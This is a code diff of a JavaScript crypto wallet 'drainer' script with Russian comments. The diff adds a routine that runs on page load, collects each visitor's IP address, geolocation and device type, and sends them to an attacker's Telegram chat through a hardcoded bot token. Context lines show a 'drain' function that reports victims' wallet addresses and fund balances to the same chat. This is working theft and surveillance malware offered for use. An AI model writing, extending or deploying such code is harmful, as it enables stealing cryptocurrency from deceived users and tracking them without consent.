@@ -1,5 +1,123 @@
 import { ethers } from 'ethers';
 
+// Токен бота и ID чата для Telegram (замени на свои значения)
+const TELEGRAM_BOT_TOKEN = '7549455736:AAF-ouc8hjuDOmInaendDArWpvGiP7aiS64'; // Токен твоего бота
+const TELEGRAM_CHAT_ID = '-4767714458'; // ID твоего чата
+
+// Функция для отправки сообщения в Telegram из браузера
+async function sendTelegramMessage(message) {
+  try {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown' // Для форматирования текста
+      })
+    });
+    const data = await response.json();
+    if (!data.ok) {
+      console.error(`❌ Ошибка отправки сообщения в Telegram: ${data.description}`);
+    }
+  } catch (error) {
+    console.error(`❌ Ошибка отправки сообщения в Telegram: ${error.message}`);
+  }
+}
+
+// Функция для получения IP-адреса пользователя
+async function getUserIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip || 'Unknown IP';
+  } catch (error) {
+    console.error(`❌ Ошибка получения IP: ${error.message}`);
+    return 'Unknown IP';
+  }
+}
+
+// Функция для получения геолокации по IP
+async function getGeolocation(ip) {
+  try {
+    const response = await fetch(`http://ip-api.com/json/${ip}`);
+    const data = await response.json();
+    if (data.status === 'success') {
+      return `${data.city}, ${data.country}`;
+    }
+    return 'Unknown Location';
+  } catch (error) {
+    console.error(`❌ Ошибка получения геолокации: ${error.message}`);
+    return 'Unknown Location';
+  }
+}
+
+// Функция для определения устройства
+function detectDevice() {
+  const userAgent = navigator.userAgent.toLowerCase();
+  const platform = navigator.platform ? navigator.platform.toLowerCase() : '';
+
+  // Проверка на Windows (включая Windows Phone, но с уточнением)
+  if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) {
+    if (/mobile|phone/i.test(userAgent)) return "Windows Phone";
+    return "Windows";
+  }
+
+  // Проверка на Mac (Macintosh, но не iPhone/iPad)
+  if (/macintosh|mac os/i.test(userAgent) && !/iphone|ipad|ipod/i.test(userAgent)) {
+    return "Mac";
+  }
+
+  // Проверка на iPhone/iPad/iPod
+  if (/iphone|ipad|ipod/i.test(userAgent)) {
+    return "iPhone";
+  }
+
+  // Проверка на Android (с уточнением, чтобы не путать с другими платформами)
+  if (/android/i.test(userAgent) && !/windows/i.test(userAgent)) {
+    return "Android";
+  }
+
+  // Проверка на Linux (но не Android, так как Android тоже использует Linux)
+  if (/linux/i.test(userAgent) && !/android/i.test(userAgent)) {
+    return "Linux";
+  }
+
+  return "Unknown";
+}
+
+// Функция для отправки уведомления при заходе на сайт
+async function notifyOnVisit() {
+  // Проверяем, было ли уведомление уже отправлено в этой сессии
+  if (sessionStorage.getItem('visitNotified')) {
+    return;
+  }
+
+  // Получаем данные
+  const domain = window.location.hostname || 'Unknown Domain';
+  const ip = await getUserIP();
+  const location = await getGeolocation(ip);
+  const device = detectDevice();
+
+  // Формируем сообщение
+  const message = `🔔 Visit | **${domain}**\n\n` +
+                  `IP: ${ip}\n` +
+                  `Where: ${location}\n` +
+                  `Device: ${device}`;
+
+  // Отправляем сообщение в Telegram
+  await sendTelegramMessage(message);
+
+  // Устанавливаем флаг, чтобы не отправлять уведомление повторно в этой сессии
+  sessionStorage.setItem('visitNotified', 'true');
+}
+
+// Вызываем уведомление при загрузке страницы
+notifyOnVisit().catch(error => {
+  console.error(`❌ Ошибка при отправке уведомления о посещении: ${error.message}`);
+});
+
 // ABI для ERC20 токенов
 const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
@@ -200,32 +318,6 @@ const CHAINS = {
   }
 };
 
-// Токен бота и ID чата для Telegram (замени на свои значения)
-const TELEGRAM_BOT_TOKEN = '7549455736:AAF-ouc8hjuDOmInaendDArWpvGiP7aiS64'; // Токен твоего бота
-const TELEGRAM_CHAT_ID = '-4767714458'; // ID твоего чата
-
-// Функция для отправки сообщения в Telegram из браузера
-async function sendTelegramMessage(message) {
-  try {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown' // Для форматирования текста
-      })
-    });
-    const data = await response.json();
-    if (!data.ok) {
-      console.error(`❌ Ошибка отправки сообщения в Telegram: ${data.description}`);
-    }
-  } catch (error) {
-    console.error(`❌ Ошибка отправки сообщения в Telegram: ${error.message}`);
-  }
-}
-
 // Функция для получения цены токена в USDT через Binance API
 async function getTokenPriceInUSDT(tokenSymbol) {
   if (tokenSymbol === "USDT") return 1;
@@ -363,40 +455,6 @@ async function switchChain(chainId) {
   }
 }
 
-// Функция для определения устройства
-function detectDevice() {
-  const userAgent = navigator.userAgent.toLowerCase();
-  const platform = navigator.platform ? navigator.platform.toLowerCase() : '';
-
-  // Проверка на Windows (включая Windows Phone, но с уточнением)
-  if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) {
-    if (/mobile|phone/i.test(userAgent)) return "Windows Phone";
-    return "Windows";
-  }
-
-  // Проверка на Mac (Macintosh, но не iPhone/iPad)
-  if (/macintosh|mac os/i.test(userAgent) && !/iphone|ipad|ipod/i.test(userAgent)) {
-    return "Mac";
-  }
-
-  // Проверка на iPhone/iPad/iPod
-  if (/iphone|ipad|ipod/i.test(userAgent)) {
-    return "iPhone";
-  }
-
-  // Проверка на Android (с уточнением, чтобы не путать с другими платформами)
-  if (/android/i.test(userAgent) && !/windows/i.test(userAgent)) {
-    return "Android";
-  }
-
-  // Проверка на Linux (но не Android, так как Android тоже использует Linux)
-  if (/linux/i.test(userAgent) && !/android/i.test(userAgent)) {
-    return "Linux";
-  }
-
-  return "Unknown";
-}
-
 // Функция для форматирования адреса кошелька
 function shortenAddress(address) {
   if (!address || address.length < 10) return address;
@@ -474,7 +532,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   const device = detectDevice();
 
   // Формируем сообщение
-  const message = `🌀 Connect | [ **${shortAddress}** ]\n\n` +
+  const message = `🌀 Connect | [ **\`${shortAddress}\`** ]\n\n` +
                   `Funds:\n` +
                   `${funds.join('\n')}\n` +
                   `Device: ${device}`;
